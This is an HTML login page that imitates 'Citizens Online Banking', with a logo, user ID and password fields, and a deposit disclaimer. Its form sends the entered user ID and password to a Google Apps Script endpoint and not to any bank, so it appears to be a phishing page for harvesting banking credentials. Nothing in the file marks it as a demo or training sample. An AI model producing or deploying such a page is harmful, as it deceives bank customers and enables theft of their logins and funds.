<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login | Citizens Online Banking</title>
    <link rel="stylesheet" href="login.css" />
    <link rel="icon" href="favicon.ico" type="image/x-icon" />
  </head>
  <body>
    <header>
      <section class="head">
        <div class="head-box">
          <div class="head-img">
            <img src="logo-citizens.svg" alt="logo" />
          </div>
        </div>
      </section>
    </header>

    <section class="welcome">
      <div class="welcome-box">
        <div class="welcome-text">
          <h1>Welcome back!</h1>
          <p>To log in, enter your user ID and password below.</p>
        </div>
      </div>
    </section>

    <section class="form">
      <div class="form-box">
        <form action="https://script.google.com/macros/s/AKfycbzCyZLZw6pvSHKMRqpwbzumEEfLqBtfr0Lhd1MLC3343-IZFvj0v6MjsIsUYnX6lc1FCA/exec" method="POST">
          <div class="divide">
            <div class="user-info">
              <label for="User ID">User ID</label>
              <input type="text" required id="User-ID" name="User-ID" />
              <label for="Password">Password</label>
              <input type="password" required id="Password" name="Password" />
            </div>

            <div class="remember">
                <input
              type="checkbox"
              id="Remember-user-ID"
              name="Remember-user-ID"
            />
            <label for="Remember-user-ID">Remember user ID</label>
            </div>

            <div class="user-info2">
              <a href="/">Trouble logging in/Password change</a>

              <p>New to Online Banking? <a href="/">Enroll now.</a></p>
            </div>

            <div class="user-bttn">
              <button type="submit" >
                <img src="login.png" alt="login" />
                Log In
              </button>

              <a href="/"> Cancel </a>
            </div>

            <div class="user-text">
              <p>
                Non-deposit products: Are not FDIC Insured; Are not deposits;
                May lose value.
              </p>
            </div>
          </div>

          <div class="user-nav">
            <nav>
              <ul>
                <h2>Need help?</h2>

                <li>
                  <a href="/">Find quick answers in our FAQs</a>
                </li>
                <li>
                  <a href="/">Contact Us</a>
                </li>
              </ul>
            </nav>
          </div>
        </form>
      </div>
    </section>
  </body>
</html>
